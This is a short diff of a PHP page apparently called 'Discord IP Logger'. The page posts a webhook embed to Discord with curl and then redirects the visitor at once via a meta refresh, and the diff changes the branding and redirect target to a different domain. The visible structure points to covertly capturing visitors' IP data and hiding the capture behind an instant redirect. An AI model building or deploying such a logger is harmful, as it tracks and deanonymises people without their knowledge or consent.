@@ -34,8 +34,8 @@ $headers = [ 'Content-Type: application/json; charset=utf-8' ];
 $timestamp = date("c", strtotime("now"));
 $POST = [ 'username' => 'Discord IP Logger', "embeds" =>[
 [
-"title" => "mordplan.de",
-"url" => "https://mordplan.de",
+"title" => "armiin.tk",
+"url" => "https://www.armiin.tk",
 "type" => "rich",
 "color" => hexdec( "010101" ),
 "fields" => [
@@ -64,6 +64,6 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
 echo $response   = curl_exec($ch);
 ?>
-<meta http-equiv="refresh" content="0; url=https://mordplan.de">
+<meta http-equiv="refresh" content="0; url=https://www.armiin.tk">
 </body>
 </html>
